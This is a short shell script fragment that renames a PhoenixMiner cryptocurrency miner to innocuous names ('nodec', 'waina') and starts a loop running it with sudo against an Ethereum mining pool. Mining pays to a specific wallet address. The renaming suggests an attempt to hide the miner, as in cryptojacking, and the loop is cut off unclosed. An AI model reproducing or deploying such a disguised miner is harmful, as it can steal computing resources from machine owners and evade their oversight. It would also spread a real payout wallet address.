...
mv PhoenixMiner_5.6d_Linux nodec && cd nodec
mv PhoenixMiner waina
while [ $x -le 20 ]
do

  sudo ./waina -pool eth.2miners.com:2020 -wal 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.PNIX$P -pass x -mi 14 -gt 400
